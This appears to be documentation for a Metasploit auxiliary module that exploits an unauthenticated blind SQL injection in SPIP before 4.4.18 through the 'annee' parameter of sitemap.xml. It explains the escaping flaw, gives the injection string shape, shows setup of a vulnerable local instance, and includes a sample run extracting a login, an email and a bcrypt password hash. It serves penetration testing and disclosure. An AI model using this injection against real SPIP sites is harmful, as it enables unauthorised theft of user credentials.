## Vulnerable Application

This module exploits an unauthenticated blind SQL injection in SPIP < 4.4.18
via the `annee` parameter on the public `sitemap.xml` page to extract login,
email, and bcrypt password hashes from the `spip_auteurs` table.

SPIP versions prior to 4.4.18 are affected by an unauthenticated blind SQL
injection in the date column escaping logic. The `_sqlite_calculer_cite()` and
`spip_mysql_cite()` functions skip SQL escaping for date-type columns when the
value matches `/^\w+\(/` (intended for SQL functions like `NOW()`). By injecting
a value like `abs(99999)) UNION SELECT ...` via the `annee` GET parameter on
the public `sitemap.xml` page, an attacker can execute arbitrary SQL.

The module uses boolean-based blind injection with binary search to extract
bcrypt password hashes from the `spip_auteurs` table.

Affected versions: SPIP < 4.4.18
Fixed version: SPIP 4.4.18

A vulnerable SPIP instance can be set up as follows:

```
wget https://files.spip.net/spip/archives/spip-v4.4.9.zip
unzip spip-v4.4.9.zip -d spip-v4.4.9
cd spip-v4.4.9
php -S 127.0.0.1:8080
```

Then visit `http://127.0.0.1:8080/ecrire/` to complete the installation wizard
(SQLite is easiest for testing). Create an admin account when prompted.

## Verification Steps

1. Install SPIP < 4.4.18
1. Start msfconsole
1. Do: `use auxiliary/scanner/http/spip_annee_sqli`
1. Do: `set RHOSTS [ip]`
1. Do: `set RPORT [port]`
1. Do: `run`
1. You should see extracted login, email, and bcrypt password hash for each user.

## Options

### ID_AUTEUR

The starting user ID to extract. SPIP assigns sequential IDs; the first admin
created during installation is typically `id_auteur=1`. (Default: `1`)

### MAX_USERS

Maximum number of consecutive user IDs to attempt extraction for, starting from
ID_AUTEUR. (Default: `5`)

## Scenarios

### SPIP 4.4.9 on Linux with SQLite

```
msf > use auxiliary/scanner/http/spip_annee_sqli
msf auxiliary(scanner/http/spip_annee_sqli) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf auxiliary(scanner/http/spip_annee_sqli) > set RPORT 8080
RPORT => 8080
msf auxiliary(scanner/http/spip_annee_sqli) > run
[*] Running module against 127.0.0.1
[*] SPIP Version detected: 4.4.9
[*] Verifying blind SQLi via sitemap.xml annee parameter...
[+] Blind SQLi confirmed!
[*] Extracting user id_auteur=1...
[+]   Login: jvoisin
[*]   [10] spip@dustr
[+]   Email: spip@dustri.org
[*]   Extracting password hash (this takes a moment)...
[*]   [10] $2y$12$iR/
[*]   [20] $2y$12$iR/qL5rAIPQtl
[*]   [30] $2y$12$iR/qL5rAIPQtlVSuCQieK.b
[*]   [40] $2y$12$iR/qL5rAIPQtlVSuCQieK.bobNJUdyMtn
[*]   [50] $2y$12$iR/qL5rAIPQtlVSuCQieK.bobNJUdyMtniOxILWvT23
[*]   [60] $2y$12$iR/qL5rAIPQtlVSuCQieK.bobNJUdyMtniOxILWvT23t9L7..LXxK
[+]   Hash:  $2y$12$iR/qL5rAIPQtlVSuCQieK.bobNJUdyMtniOxILWvT23t9L7..LXxK
[*] No user with id_auteur=2, skipping
[*] No user with id_auteur=3, skipping
[*] No user with id_auteur=4, skipping
[*] No user with id_auteur=5, skipping
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/spip_annee_sqli) > 
```
